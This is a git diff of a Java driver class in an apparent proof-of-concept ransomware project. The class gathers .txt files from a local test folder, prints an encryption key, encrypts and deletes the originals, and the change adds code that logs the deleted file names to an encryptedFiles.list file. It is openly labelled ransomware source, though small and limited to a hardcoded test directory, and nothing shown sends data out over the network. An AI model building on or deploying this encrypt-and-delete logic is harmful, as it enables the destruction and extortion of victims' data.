@@ -1,6 +1,8 @@
 package ransomware;
 
 import java.io.File;
+import java.io.FileWriter;
+import java.io.IOException;
 import java.security.NoSuchAlgorithmException;
 import java.util.ArrayList;
 
@@ -9,7 +11,7 @@ import ransomware.exceptions.CryptoException;
 public class UtilsDriver {
     private static String key = "";
 
-    public static void main(String[] args) throws NoSuchAlgorithmException {
+    public static void main(String[] args) throws NoSuchAlgorithmException, IOException {
         String folderPath = "D:/Coding/POC-Ransomware/src/main/java/ransomware/testfiles/";
         File folder = new File(folderPath);
         ArrayList<File> files = new ArrayList<>(0);
@@ -24,7 +26,7 @@ public class UtilsDriver {
         System.out.println(key);
         
         for (File file : fileArray) {
-            if (file.getName().contains(".txt")) {
+            if (file.getName().endsWith(".txt")) {
                 files.add(file);
             }
         }
@@ -44,11 +46,13 @@ public class UtilsDriver {
             inputFile.delete();
         }
 
-        File encryptedFileList = new File(folderPath + "D:/Coding/POC-Ransomware/src/main/java/ransomware/encryptedFiles.list");
+        File encryptedFileList = new File("D:/Coding/POC-Ransomware/src/main/java/ransomware/encryptedFiles.list");
 
+        FileWriter fr = new FileWriter(encryptedFileList, true);
         for (String fileName : deletedFiles) {
-            encryptedFileList.
-            System.out.println("Encrypted and deleted file: " + fileName);
+            fr.write(fileName + "\n");
+            System.out.println("Encrypted and deleted file: " + fileName );
         }
+        fr.close();
     }
 }
